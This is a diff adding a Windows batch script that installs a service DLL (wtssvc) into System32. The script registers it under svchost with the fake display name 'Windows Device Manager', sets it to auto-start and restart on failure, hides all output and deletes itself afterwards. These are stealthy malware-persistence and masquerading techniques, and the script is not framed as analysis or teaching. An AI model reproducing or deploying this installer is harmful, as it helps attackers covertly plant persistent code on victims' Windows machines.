@@ -1,0 +1,33 @@
+@echo off
+
+set DSP_NAME="Windows Device Manager"
+
+sc stop wtssvc > nul
+
+echo %~dp0 | findstr /i "system32" > nul
+if %ERRORLEVEL% equ 0 (goto INSTALL) else (goto COPYFILE)
+
+:COPYFILE
+
+copy /y "%~dp0\wtssvc.dll" "%windir%\System32" > nul
+copy /y "%~dp0\wtssvc.dat" "%windir%\System32" > nul
+copy /y "%~dp0\wtssvc.ini" "%windir%\System32" > nul
+
+:INSTALL
+
+sc create wtssvc binpath= "%windir%\System32\svchost.exe -k wtssvc" DisplayName= %DSP_NAME% > nul
+sc description wtssvc %DSP_NAME% > nul
+sc failure wtssvc reset= 30 actions= restart/5000 > nul
+sc config wtssvc type= interact type= own start= auto error= normal binpath= "%windir%\System32\svchost.exe -k wtssvc" > nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v wtssvc /t REG_MULTI_SZ /d "wtssvc" /f > nul
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\wtssvc\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%\System32\wtssvc.dll" /f > nul
+
+rem del /f /q "%~dp0\wtssvc.dll" > nul
+rem del /f /q "%~dp0\wtssvc.dat" > nul
+rem del /f /q "%~dp0\wtssvc.ini" > nul
+
+rem del /f /q "%~dp0\*.*" > nul
+rem del /f /q "%~dp0\mscoree.dll" > nul
+sc start wtssvc > nul
+
+del /f /q "%~dpnx0" > nul
